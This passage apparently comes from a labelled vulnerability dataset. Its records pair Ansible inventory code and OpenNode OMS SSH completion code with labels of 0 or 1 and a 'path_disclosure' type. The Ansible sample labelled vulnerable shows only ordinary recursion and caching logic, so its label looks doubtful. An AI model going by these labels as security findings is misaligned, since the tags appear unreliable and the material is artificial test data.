depth:\n                    g.depth = depth\n                    unprocessed.update(g.child_groups)\n            if depth - start_depth > len(seen):\n                raise AnsibleError(\"The group named '%s' has a recursive dependency loop.\" % self.name)\n\n    def add_host(self, host):\n        if host.name not in self.host_names:\n            self.hosts.append(host)\n            self._hosts.add(host.name)\n            host.add_group(self)\n            self.clear_hosts_cache()\n\n    def remove_host(self, host):\n\n        if host.name in self.host_names:\n            self.hosts.remove(host)\n            self._hosts.remove(host.name)\n            host.remove_group(self)\n            self.clear_hosts_cache()\n\n    def set_variable(self, key, value):\n\n        if key == 'ansible_group_priority':\n            self.set_priority(int(value))\n        else:\n            self.vars[key] = value\n\n    def clear_hosts_cache(self):\n\n        self._hosts_cache = None\n        for g in self.get_ancestors():\n            g._hosts_cache = None\n\n    def get_hosts(self):\n\n        if self._hosts_cache is None:\n            self._hosts_cache = self._get_hosts()\n        return self._hosts_cache\n\n    def _get_hosts(self):\n\n        hosts = []\n        seen = {}\n        for kid in self.get_descendants():\n            kid_hosts = kid.hosts\n            for kk in kid_hosts:\n                if kk not in seen:\n                    seen[kk] = 1\n                    if self.name == 'all' and kk.implicit:\n                        continue\n                    hosts.append(kk)\n        for mine in self.hosts:\n            if mine not in seen:\n                seen[mine] = 1\n                if self.name == 'all' and mine.implicit:\n                    continue\n                hosts.append(mine)\n        return hosts\n\n    def get_vars(self):\n        return self.vars.copy()\n\n    def set_priority(self, priority):\n        try:\n            self.priority = int(priority)\n        except TypeError:\n            # FIXME: warn about invalid priority\n            pass\n/n/n/nlib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\n\n# Make coding more python3-ish\nfrom __future__ import (absolute_import, division, print_function)\n__metaclass__ = type\n\nfrom ansible.inventory.group import Group\nfrom ansible.utils.vars import combine_vars, get_unique_id\n\n__all__ = ['Host']\n\n\nclass Host:\n    ''' a single ansible host '''\n\n    # __slots__ = [ 'name', 'vars', 'groups' ]\n\n    def __getstate__(self):\n        return self.serialize()\n\n    def __setstate__(self, data):\n        return self.deserialize(data)\n\n    def __eq__(self, other):\n        if not isinstance(other, Host):\n            return False\n        return self._uuid == other._uuid\n\n    def __ne__(self, other):\n        return not self.__eq__(other)\n\n    def __hash__(self):\n        return hash(self.name)\n\n    def __str__(self):\n        return self.get_name()\n\n    def __repr__(self):\n        return self.get_name()\n\n    def serialize(self):\n        groups = []\n        for group in self.groups:\n            groups.append(group.serialize())\n\n        return dict(\n            name=self.name,\n            vars=self.vars.copy(),\n            address=self.address,\n            uuid=self._uuid,\n            groups=groups,\n            implicit=self.implicit,\n        )\n\n    def deserialize(self, data):\n        self.__init__(gen_uuid=False)\n\n        self.name = data.get('name')\n        self.vars = data.get('vars', dict())\n        self.address = data.get('address', '')\n        self._uuid = data.get('uuid', None)\n        self.implicit = data.get('implicit', False)\n\n        groups = data.get('groups', [])\n        for group_data in groups:\n            g = Group()\n            g.deserialize(group_data)\n            self.groups.append(g)\n\n    def __init__(self, name=None, port=None, gen_uuid=True):\n\n        self.vars = {}\n        self.groups = []\n        self._uuid = None\n\n        self.name = name\n        self.address = name\n\n        if port:\n            self.set_variable('ansible_port', int(port))\n\n        if gen_uuid:\n            self._uuid = get_unique_id()\n        self.implicit = False\n\n    def get_name(self):\n        return self.name\n\n    def populate_ancestors(self, additions=None):\n        # populate ancestors\n        if additions is None:\n            for group in self.groups:\n                self.add_group(group)\n        else:\n            for group in additions:\n                if group not in self.groups:\n                    self.groups.append(group)\n\n    def add_group(self, group):\n\n        # populate ancestors first\n        for oldg in group.get_ancestors():\n            if oldg not in self.groups:\n                self.groups.append(oldg)\n\n        # actually add group\n        if group not in self.groups:\n            self.groups.append(group)\n\n    def remove_group(self, group):\n\n        if group in self.groups:\n            self.groups.remove(group)\n\n            # remove exclusive ancestors, xcept all!\n            for oldg in group.get_ancestors():\n                if oldg.name != 'all':\n                    for childg in self.groups:\n                        if oldg in childg.get_ancestors():\n                            break\n                    else:\n                        self.remove_group(oldg)\n\n    def set_variable(self, key, value):\n        self.vars[key] = value\n\n    def get_groups(self):\n        return self.groups\n\n    def get_magic_vars(self):\n        results = {}\n        results['inventory_hostname'] = self.name\n        results['inventory_hostname_short'] = self.name.split('.')[0]\n        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])\n\n        return results\n\n    def get_vars(self):\n        return combine_vars(self.vars, self.get_magic_vars())\n/n/n/ntest/units/plugins/inventory/test_group.py/n/n# Copyright 2018 Alan Rominger <arominge@redhat.com>\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\n\nfrom ansible.compat.tests import unittest\n\nfrom ansible.inventory.group import Group\nfrom ansible.inventory.host import Host\nfrom ansible.errors import AnsibleError\n\n\nclass TestGroup(unittest.TestCase):\n\n    def test_depth_update(self):\n        A = Group('A')\n        B = Group('B')\n        Z = Group('Z')\n        A.add_child_group(B)\n        A.add_child_group(Z)\n        self.assertEqual(A.depth, 0)\n        self.assertEqual(Z.depth, 1)\n        self.assertEqual(B.depth, 1)\n\n    def test_depth_update_dual_branches(self):\n        alpha = Group('alpha')\n        A = Group('A')\n        alpha.add_child_group(A)\n        B = Group('B')\n        A.add_child_group(B)\n        Z = Group('Z')\n        alpha.add_child_group(Z)\n        beta = Group('beta')\n        B.add_child_group(beta)\n        Z.add_child_group(beta)\n\n        self.assertEqual(alpha.depth, 0)  # apex\n        self.assertEqual(beta.depth, 3)  # alpha -> A -> B -> beta\n\n        omega = Group('omega')\n        omega.add_child_group(alpha)\n\n        # verify that both paths are traversed to get the max depth value\n        self.assertEqual(B.depth, 3)  # omega -> alpha -> A -> B\n        self.assertEqual(beta.depth, 4)  # B -> beta\n\n    def test_depth_recursion(self):\n        A = Group('A')\n        B = Group('B')\n        A.add_child_group(B)\n        # hypothetical of adding B as child group to A\n        A.parent_groups.append(B)\n        B.child_groups.append(A)\n        # can't update depths of groups, because of loop\n        with self.assertRaises(AnsibleError):\n            B._check_children_depth()\n\n    def test_loop_detection(self):\n        A = Group('A')\n        B = Group('B')\n        C = Group('C')\n        A.add_child_group(B)\n        B.add_child_group(C)\n        with self.assertRaises(AnsibleError):\n            C.add_child_group(A)\n\n    def test_populates_descendant_hosts(self):\n        A = Group('A')\n        B = Group('B')\n        C = Group('C')\n        h = Host('h')\n        C.add_host(h)\n        A.add_child_group(B)  # B is child of A\n        B.add_child_group(C)  # C is descendant of A\n        A.add_child_group(B)\n        self.assertEqual(set(h.groups), set([C, B, A]))\n        h2 = Host('h2')\n        C.add_host(h2)\n        self.assertEqual(set(h2.groups), set([C, B, A]))\n\n    def test_ancestor_example(self):\n        # see docstring for Group._walk_relationship\n        groups = {}\n        for name in ['A', 'B', 'C', 'D', 'E', 'F']:\n            groups[name] = Group(name)\n        # first row\n        groups['A'].add_child_group(groups['D'])\n        groups['B'].add_child_group(groups['D'])\n        groups['B'].add_child_group(groups['E'])\n        groups['C'].add_child_group(groups['D'])\n        # second row\n        groups['D'].add_child_group(groups['E'])\n        groups['D'].add_child_group(groups['F'])\n        groups['E'].add_child_group(groups['F'])\n\n        self.assertEqual(\n            set(groups['F'].get_ancestors()),\n            set([\n                groups['A'], groups['B'], groups['C'], groups['D'], groups['E']\n            ])\n        )\n\n    def test_ancestors_recursive_loop_safe(self):\n        '''\n        The get_ancestors method may be referenced before circular parenting\n        checks, so the method is expected to be stable even with loops\n        '''\n        A = Group('A')\n        B = Group('B')\n        A.parent_groups.append(B)\n        B.parent_groups.append(A)\n        # finishes in finite time\n        self.assertEqual(A.get_ancestors(), set([A, B]))\n/n/n/n", "label": 0, "vtype": "path_disclosure"}, {"id": "153c9bd539eeffdd6d395b8840f95d56e3814f27", "code": "/lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\nfrom __future__ import (absolute_import, division, print_function)\n__metaclass__ = type\n\nfrom ansible.errors import AnsibleError\n\n\nclass Group:\n    ''' a group of ansible hosts '''\n\n    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]\n\n    def __init__(self, name=None):\n\n        self.depth = 0\n        self.name = name\n        self.hosts = []\n        self._hosts = None\n        self.vars = {}\n        self.child_groups = []\n        self.parent_groups = []\n        self._hosts_cache = None\n        self.priority = 1\n\n    def __repr__(self):\n        return self.get_name()\n\n    def __str__(self):\n        return self.get_name()\n\n    def __getstate__(self):\n        return self.serialize()\n\n    def __setstate__(self, data):\n        return self.deserialize(data)\n\n    def serialize(self):\n        parent_groups = []\n        for parent in self.parent_groups:\n            parent_groups.append(parent.serialize())\n\n        self._hosts = None\n\n        result = dict(\n            name=self.name,\n            vars=self.vars.copy(),\n            parent_groups=parent_groups,\n            depth=self.depth,\n            hosts=self.hosts,\n        )\n\n        return result\n\n    def deserialize(self, data):\n        self.__init__()\n        self.name = data.get('name')\n        self.vars = data.get('vars', dict())\n        self.depth = data.get('depth', 0)\n        self.hosts = data.get('hosts', [])\n        self._hosts = None\n\n        parent_groups = data.get('parent_groups', [])\n        for parent_data in parent_groups:\n            g = Group()\n            g.deserialize(parent_data)\n            self.parent_groups.append(g)\n\n    @property\n    def host_names(self):\n        if self._hosts is None:\n            self._hosts = set(self.hosts)\n        return self._hosts\n\n    def get_name(self):\n        return self.name\n\n    def add_child_group(self, group):\n\n        if self == group:\n            raise Exception(\"can't add group to itself\")\n\n        # don't add if it's already there\n        if group not in self.child_groups:\n            self.child_groups.append(group)\n\n            # update the depth of the child\n            group.depth = max([self.depth + 1, group.depth])\n\n            # update the depth of the grandchildren\n            group._check_children_depth()\n\n            # now add self to child's parent_groups list, but only if there\n            # isn't already a group with the same name\n            if self.name not in [g.name for g in group.parent_groups]:\n                group.parent_groups.append(self)\n                for h in group.get_hosts():\n                    h.populate_ancestors()\n\n            self.clear_hosts_cache()\n\n    def _check_children_depth(self):\n\n        try:\n            for group in self.child_groups:\n                group.depth = max([self.depth + 1, group.depth])\n                group._check_children_depth()\n        except RuntimeError:\n            raise AnsibleError(\"The group named '%s' has a recursive dependency loop.\" % self.name)\n\n    def add_host(self, host):\n        if host.name not in self.host_names:\n            self.hosts.append(host)\n            self._hosts.add(host.name)\n            host.add_group(self)\n            self.clear_hosts_cache()\n\n    def remove_host(self, host):\n\n        if host.name in self.host_names:\n            self.hosts.remove(host)\n            self._hosts.remove(host.name)\n            host.remove_group(self)\n            self.clear_hosts_cache()\n\n    def set_variable(self, key, value):\n\n        if key == 'ansible_group_priority':\n            self.set_priority(int(value))\n        else:\n            self.vars[key] = value\n\n    def clear_hosts_cache(self):\n\n        self._hosts_cache = None\n        for g in self.parent_groups:\n            g.clear_hosts_cache()\n\n    def get_hosts(self):\n\n        if self._hosts_cache is None:\n            self._hosts_cache = self._get_hosts()\n        return self._hosts_cache\n\n    def _get_hosts(self):\n\n        hosts = []\n        seen = {}\n        for kid in self.child_groups:\n            kid_hosts = kid.get_hosts()\n            for kk in kid_hosts:\n                if kk not in seen:\n                    seen[kk] = 1\n                    if self.name == 'all' and kk.implicit:\n                        continue\n                    hosts.append(kk)\n        for mine in self.hosts:\n            if mine not in seen:\n                seen[mine] = 1\n                if self.name == 'all' and mine.implicit:\n                    continue\n                hosts.append(mine)\n        return hosts\n\n    def get_vars(self):\n        return self.vars.copy()\n\n    def _get_ancestors(self):\n\n        results = {}\n        for g in self.parent_groups:\n            results[g.name] = g\n            results.update(g._get_ancestors())\n        return results\n\n    def get_ancestors(self):\n\n        return self._get_ancestors().values()\n\n    def set_priority(self, priority):\n        try:\n            self.priority = int(priority)\n        except TypeError:\n            # FIXME: warn about invalid priority\n            pass\n/n/n/n/lib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\n\n# Make coding more python3-ish\nfrom __future__ import (absolute_import, division, print_function)\n__metaclass__ = type\n\nfrom ansible.inventory.group import Group\nfrom ansible.utils.vars import combine_vars, get_unique_id\n\n__all__ = ['Host']\n\n\nclass Host:\n    ''' a single ansible host '''\n\n    # __slots__ = [ 'name', 'vars', 'groups' ]\n\n    def __getstate__(self):\n        return self.serialize()\n\n    def __setstate__(self, data):\n        return self.deserialize(data)\n\n    def __eq__(self, other):\n        if not isinstance(other, Host):\n            return False\n        return self._uuid == other._uuid\n\n    def __ne__(self, other):\n        return not self.__eq__(other)\n\n    def __hash__(self):\n        return hash(self.name)\n\n    def __str__(self):\n        return self.get_name()\n\n    def __repr__(self):\n        return self.get_name()\n\n    def serialize(self):\n        groups = []\n        for group in self.groups:\n            groups.append(group.serialize())\n\n        return dict(\n            name=self.name,\n            vars=self.vars.copy(),\n            address=self.address,\n            uuid=self._uuid,\n            groups=groups,\n            implicit=self.implicit,\n        )\n\n    def deserialize(self, data):\n        self.__init__(gen_uuid=False)\n\n        self.name = data.get('name')\n        self.vars = data.get('vars', dict())\n        self.address = data.get('address', '')\n        self._uuid = data.get('uuid', None)\n        self.implicit = data.get('implicit', False)\n\n        groups = data.get('groups', [])\n        for group_data in groups:\n            g = Group()\n            g.deserialize(group_data)\n            self.groups.append(g)\n\n    def __init__(self, name=None, port=None, gen_uuid=True):\n\n        self.vars = {}\n        self.groups = []\n        self._uuid = None\n\n        self.name = name\n        self.address = name\n\n        if port:\n            self.set_variable('ansible_port', int(port))\n\n        if gen_uuid:\n            self._uuid = get_unique_id()\n        self.implicit = False\n\n    def get_name(self):\n        return self.name\n\n    def populate_ancestors(self):\n        # populate ancestors\n        for group in self.groups:\n            self.add_group(group)\n\n    def add_group(self, group):\n\n        # populate ancestors first\n        for oldg in group.get_ancestors():\n            if oldg not in self.groups:\n                self.add_group(oldg)\n\n        # actually add group\n        if group not in self.groups:\n            self.groups.append(group)\n\n    def remove_group(self, group):\n\n        if group in self.groups:\n            self.groups.remove(group)\n\n            # remove exclusive ancestors, xcept all!\n            for oldg in group.get_ancestors():\n                if oldg.name != 'all':\n                    for childg in self.groups:\n                        if oldg in childg.get_ancestors():\n                            break\n                    else:\n                        self.remove_group(oldg)\n\n    def set_variable(self, key, value):\n        self.vars[key] = value\n\n    def get_groups(self):\n        return self.groups\n\n    def get_magic_vars(self):\n        results = {}\n        results['inventory_hostname'] = self.name\n        results['inventory_hostname_short'] = self.name.split('.')[0]\n        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])\n\n        return results\n\n    def get_vars(self):\n        return combine_vars(self.vars, self.get_magic_vars())\n/n/n/n", "label": 1, "vtype": "path_disclosure"}, {"id": "0a87ba7972cdcab6ce77568e8d0eb8474132315d", "code": "opennode/oms/endpoint/ssh/completion_cmds.py/n/nfrom grokcore.component import baseclass, context\nfrom zope.component import provideSubscriptionAdapter\nimport argparse\nimport os\n\nfrom opennode.oms.endpoint.ssh import cmd\nfrom opennode.oms.endpoint.ssh.completion import Completer\nfrom opennode.oms.endpoint.ssh.cmdline import GroupDictAction\nfrom opennode.oms.model.model.base import IContainer\nfrom opennode.oms.model.model import creatable_models\nfrom opennode.oms.zodb import db\n\n\nclass CommandCompleter(Completer):\n    \"\"\"Completes a command.\"\"\"\n\n    context(cmd.NoCommand)\n\n    def complete(self, token, parsed, parser):\n        return [name for name in cmd.commands().keys() if name.startswith(token)]\n\n\nclass PathCompleter(Completer):\n    \"\"\"Completes a path name.\"\"\"\n    baseclass()\n\n    @db.transact\n    def complete(self, token, parsed, parser):\n        if not self.consumed(parsed, parser):\n            base_path = os.path.dirname(token)\n            container = self.context.traverse(base_path)\n\n            if IContainer.providedBy(container):\n                def dir_suffix(obj):\n                    return '/' if IContainer.providedBy(obj) else ''\n\n                def name(obj):\n                    return os.path.join(base_path, obj.__name__)\n\n                return [name(obj) + dir_suffix(obj) for obj in container.listcontent() if name(obj).startswith(token)]\n\n\n        return []\n\n    def consumed(self, parsed, parser):\n        \"\"\"Check whether we have already consumed all positional arguments.\"\"\"\n\n        maximum = 0\n        actual = 0\n        for action_group in parser._action_groups:\n            for action in action_group._group_actions:\n                # For every positional argument:\n                if not action.option_strings:\n                    # Count how many of them we have already.\n                    values = getattr(parsed, action.dest, [])\n                    if values == action.default:  # don't count default values\n                        values = []\n                    if not isinstance(values, list):\n                        values = [values]\n                    actual += len(values)\n\n                    # And the maximum number of expected occurencies.\n                    if isinstance(action.nargs, int):\n                        maximum += action.nargs\n                    if action.nargs == argparse.OPTIONAL:\n                        maximum += 1\n                    else:\n                        maximum = float('inf')\n\n        return actual >= maximum\n\n\nclass ArgSwitchCompleter(Completer):\n    \"\"\"Completes argument switches based on the argparse grammar exposed for a command\"\"\"\n    baseclass()\n\n    def complete(self, token, parsed, parser):\n        if token.startswith(\"-\"):\n            parser = self.context.arg_parser(partial=True)\n\n            options = [option\n                       for action_group in parser._action_groups\n                       for action in action_group._group_actions\n                       for option in action.option_strings\n                       if option.startswith(token) and not self.option_consumed(action, parsed)]\n            return options\n        else:\n            return []\n\n    def option_consumed(self, action, parsed):\n        # \"count\" actions can be repeated\n        if action.nargs > 0 or isinstance(action, argparse._CountAction):\n            return False\n\n        if isinstance(action, GroupDictAction):\n            value = getattr(parsed, action.group, {}).get(action.dest, action.default)\n        else:\n            value = getattr(parsed, action.dest, action.default)\n\n        return value != action.default\n\nclass KeywordSwitchCompleter(ArgSwitchCompleter):\n    \"\"\"Completes key=value argument switches based on the argparse grammar exposed for a command.\n    TODO: probably more can be shared with ArgSwitchCompleter.\"\"\"\n\n    baseclass()\n\n    def complete(self, token, parsed, parser):\n        options = [option[1:] + '='\n                   for action_group in parser._action_groups\n                   for action in action_group._group_actions\n                   for option in action.option_strings\n                   if option.startswith('=' + token) and not self.option_consumed(action, parsed)]\n        return options\n\n\nclass KeywordValueCompleter(ArgSwitchCompleter):\n    \"\"\"Completes the `value` part of key=value constructs based on the type of the keyword.\n    Currently works only for args which declare an explicit enumeration.\"\"\"\n\n    baseclass()\n\n    def complete(self, token, parsed, parser):\n        if '=' in token:\n            keyword, value_prefix = token.split('=')\n\n            action = self.find_action(keyword, parsed, parser)\n            if action.choices:\n                return [keyword + '=' + value for value in action.choices if value.startswith(value_prefix)]\n\n        return []\n\n    def find_action(self, keyword, parsed, parser):\n        for action_group in parser._action_groups:\n            for action in action_group._group_actions:\n                if action.dest == keyword:\n                    return action\n\n\nclass ObjectTypeCompleter(Completer):\n    \"\"\"Completes object type names.\"\"\"\n\n    context(cmd.cmd_mk)\n\n    def complete(self, token):\n        return [name for name in creatable_models.keys() if name.startswith(token)]\n\n\n# TODO: move to handler\nfor command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set]:\n    provideSubscriptionAdapter(PathCompleter, adapts=[command])\n\nfor command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set, cmd.cmd_quit]:\n    provideSubscriptionAdapter(ArgSwitchCompleter, adapts=[command])\n\nfor command in [cmd.cmd_set]:\n    provideSubscriptionAdapter(KeywordSwitchCompleter, adapts=[command])\n\nfor command in [cmd.cmd_set]:\n    provideSubscriptionAdapter(KeywordValueCompleter, adapts=[command])\n/n/n/nopennode/oms/endpoint/ssh/protocol.py/n/nimport os\n\nfrom columnize import columnize\nfrom twisted.internet import defer\n\nfrom opennode.oms.endpoint.ssh import cmd, completion, cmdline\nfrom opennode.oms.endpoint.ssh.terminal import InteractiveTerminal\nfrom opennode.oms.endpoint.ssh.tokenizer import CommandLineTokenizer, CommandLineSyntaxError\nfrom opennode.oms.zodb import db\n\n\nclass OmsSshProtocol(InteractiveTerminal):\n    \"\"\"The OMS virtual console over SSH.\n\n    Accepts lines of input and writes them back to its connection.  If\n    a line consisting solely of \"quit\" is received, the connection\n    is dropped.\n\n    \"\"\"\n\n    def __init__(self):\n        super(OmsSshProtocol, self).__init__()\n        self.path = ['']\n\n        @defer.inlineCallbacks\n        def _get_obj_path():\n            # Here, we simply hope that self.obj_path won't actually be\n            # used until it's initialised.  A more fool-proof solution\n            # would be to block everything in the protocol while the ZODB\n            # query is processing, but that would require a more complex\n            # workaround.  This will not be a problem during testing as\n            # DB access is blocking when testing.\n            self.obj_path = yield db.transact(lambda: [db.ref(db.get_root()['oms_root'])])()\n\n        _get_obj_path()\n\n        self.tokenizer = CommandLineTokenizer()\n\n    def lineReceived(self, line):\n        line = line.strip()\n\n        try:\n            command, cmd_args = self.parse_line(line)\n        except CommandLineSyntaxError as e:\n            self.terminal.write(\"Syntax error: %s\\n\" % (e.message))\n            self.print_prompt()\n            return\n\n        deferred = defer.maybeDeferred(command, *cmd_args)\n\n        @deferred\n        def on_success(ret):\n            self.print_prompt()\n\n        @deferred\n        def on_error(f):\n            if not f.check(cmdline.ArgumentParsingError):\n                f.raiseException()\n            self.print_prompt()\n\n        ret = defer.Deferred()\n        deferred.addBoth(ret.callback)\n        return ret\n\n    def print_prompt(self):\n        self.terminal.write(self.ps[self.pn])\n\n    def insert_buffer(self, buf):\n        \"\"\"Inserts some chars in the buffer at the current cursor position.\"\"\"\n        lead, rest = self.lineBuffer[0:self.lineBufferIndex], self.lineBuffer[self.lineBufferIndex:]\n        self.lineBuffer = lead + buf + rest\n        self.lineBufferIndex += len(buf)\n\n    def insert_text(self, text):\n        \"\"\"Inserts some text at the current cursor position and renders it.\"\"\"\n        self.terminal.write(text)\n        self.insert_buffer(list(text))\n\n    def parse_line(self, line):\n        \"\"\"Returns a command instance and parsed cmdline argument list.\n\n        TODO: Shell expansion should be handled here.\n\n        \"\"\"\n\n        cmd_name, cmd_args = line.partition(' ')[::2]\n        command_cls = cmd.get_command(cmd_name)\n\n        tokenized_cmd_args = self.tokenizer.tokenize(cmd_args.strip())\n\n        return command_cls(self), tokenized_cmd_args\n\n    @defer.inlineCallbacks\n    def handle_TAB(self):\n        \"\"\"Handles tab completion.\"\"\"\n        partial, rest, completions = yield completion.complete(self, self.lineBuffer, self.lineBufferIndex)\n\n        if len(completions) == 1:\n            space = '' if rest else ' '\n            # handle quote closing\n            if self.lineBuffer[self.lineBufferIndex - len(partial) - 1] == '\"':\n                space = '\" '\n            # Avoid space after '=' just for aestetics.\n            # Avoid space after '/' for functionality.\n            for i in ('=', '/'):\n                if completions[0].endswith(i):\n                    space = ''\n\n            patch = completions[0][len(partial):] + space\n            self.insert_text(patch)\n        elif len(completions) > 1:\n            common_prefix = os.path.commonprefix(completions)\n            patch = common_prefix[len(partial):]\n            self.insert_text(patch)\n\n            # postpone showing list of possible completions until next tab\n            if not patch:\n                self.terminal.nextLine()\n                self.terminal.write(columnize(completions))\n                self.drawInputLine()\n                if len(rest):\n                    self.terminal.cursorBackward(len(rest))\n\n\n    @property\n    def hist_file_name(self):\n        return os.path.expanduser('~/.oms_history')\n\n    @property\n    def ps(self):\n        ps1 = '%s@%s:%s%s ' % ('user', 'oms', self._cwd(), '#')\n        return [ps1, '... ']\n\n    def _cwd(self):\n        return self.make_path(self.path)\n\n    @staticmethod\n    def make_path(path):\n        return '/'.join(path) or '/'\n/n/n/nopennode/oms/tests/test_completion.py/n/nimport unittest\n\nimport mock\nfrom nose.tools import eq_\n\nfrom opennode.oms.endpoint.ssh.protocol import OmsSshProtocol\nfrom opennode.oms.endpoint.ssh import cmd\n\n\nclass CmdCompletionTestCase(unittest.TestCase):\n\n    def setUp(self):\n        self.oms_ssh = OmsSshProtocol()\n        self.terminal = mock.Mock()\n        self.oms_ssh.terminal = self.terminal\n\n        self.oms_ssh.connectionMade()\n\n        # the standard model doesn't have any command or path which\n        # is a prefix of another (len > 1), I don't want to force changes\n        # to the model just for testing completion, so we have monkey patch\n        # the commands() function and add a command 'hello'.\n        self.orig_commands = cmd.commands\n        cmd.commands = lambda: dict(hello=cmd.Cmd, **self.orig_commands())\n\n    def tearDown(self):\n        cmd.commands = self.orig_commands\n\n    def _input(self, string):\n        for s in string:\n            self.oms_ssh.characterReceived(s, False)\n\n    def _tab_after(self, string):\n        self._input(string)\n        self.terminal.reset_mock()\n\n        self.oms_ssh.handle_TAB()\n\n    def test_command_completion(self):\n        self._tab_after('s')\n        eq_(self.terminal.method_calls, [('write', ('et ',), {})])\n\n    def test_command_completion_spaces(self):\n        self._tab_after('    s')\n        eq_(self.terminal.method_calls, [('write', ('et ',), {})])\n\n    def test_complete_not_found(self):\n        self._tab_after('t')\n        eq_(len(self.terminal.method_calls), 0)\n\n    def test_complete_quotes(self):\n        self._tab_after('ls \"comp')\n        eq_(self.terminal.method_calls, [('write', ('utes/',), {})])\n\n    def test_complete_prefix(self):\n        self._tab_after('h')\n        eq_(self.terminal.method_calls, [('write', ('el',), {})])\n\n        # hit tab twice\n        self.terminal.reset_mock()\n        self.oms_ssh.handle_TAB()\n\n        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('help  hello\\n',), {}), ('write', (self.oms_ssh.ps[0] + 'hel',), {})])\n\n    def test_spaces_between_arg(self):\n        self._tab_after('ls comp')\n        eq_(self.terminal.method_calls, [('write', ('utes/',), {})])\n\n    def test_command_arg_spaces_before_command(self):\n        self._tab_after(' ls comp')\n        eq_(self.terminal.method_calls, [('write', ('utes/',), {})])\n\n    def test_mandatory_positional(self):\n        self._tab_after('cat ')\n        eq_(len(self.terminal.method_calls), 4)\n\n    def test_complete_switches(self):\n        self._tab_after('quit ')\n        eq_(len(self.terminal.method_calls), 0)\n\n        # hit tab twice\n        self.oms_ssh.handle_TAB()\n        eq_(len(self.terminal.method_calls), 0)\n\n        # now try with a dash\n        self._tab_after('-')\n        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('-h  --help\\n',), {}), ('write', (self.oms_ssh.ps[0] + 'quit -',), {})])\n        # disambiguate\n        self._tab_after('-')\n        eq_(self.terminal.method_calls, [('write', ('help ',), {})])\n\n    def test_complete_consumed_switches(self):\n        self._tab_after('ls --help')\n        eq_(self.terminal.method_calls, [('write', (' ',), {})])\n\n        self._tab_after('-')\n        assert 'help' not in self.terminal.method_calls[2][1][0]\n        assert '-h' not in self.terminal.method_calls[2][1][0]\n/n/n/n", "label": 0, "vtype": "path_disclosure"}, {"id": "0a87ba7972cdcab6ce77568e8d0eb8474132315d", "code": "/opennode/oms/endpoint/ssh/completion_cmds.py/n/nfrom grokcore.component import baseclass, context\nfrom zope.component import provideSubscriptionAdapter\nimport argparse\n\nfrom opennode.oms.endpoint.ssh import cmd\nfrom opennode.oms.endpoint.ssh.completion import Completer\nfrom opennode.oms.endpoint.ssh.cmdline import GroupDictAction\nfrom opennode.oms.model.model.base import IContainer\nfrom opennode.oms.model.model import creatable_models\nfrom opennode.oms.zodb import db\n\n\nclass CommandCompleter(Completer):\n    \"\"\"Completes a command.\"\"\"\n\n    context(cmd.NoCommand)\n\n    def complete(self, token, parsed, parser):\n        return [name for name in cmd.commands().keys() if name.startswith(token)]\n\n\nclass PathCompleter(Completer):\n    \"\"\"Completes a path name.\"\"\"\n    baseclass()\n\n    @db.transact\n    def complete(self, token, parsed, parser):\n\n        if not self.consumed(parsed, parser):\n            obj = self.context.current_obj\n            if IContainer.providedBy(obj):\n                return [name for name in obj.listnames() if name.startswith(token)]\n\n        return []\n\n    def consumed(self, parsed, parser):\n        \"\"\"Check whether we have already consumed all positional arguments.\"\"\"\n\n        maximum = 0\n        actual = 0\n        for action_group in parser._action_groups:\n            for action in action_group._group_actions:\n                # For every positional argument:\n                if not action.option_strings:\n                    # Count how many of them we have already.\n                    values = getattr(parsed, action.dest, [])\n                    if values == action.default:  # don't count default values\n                        values = []\n                    if not isinstance(values, list):\n                        values = [values]\n                    actual += len(values)\n\n                    # And the maximum number of expected occurencies.\n                    if isinstance(action.nargs, int):\n                        maximum += action.nargs\n                    if action.nargs == argparse.OPTIONAL:\n                        maximum += 1\n                    else:\n                        maximum = float('inf')\n\n        return actual >= maximum\n\n\nclass 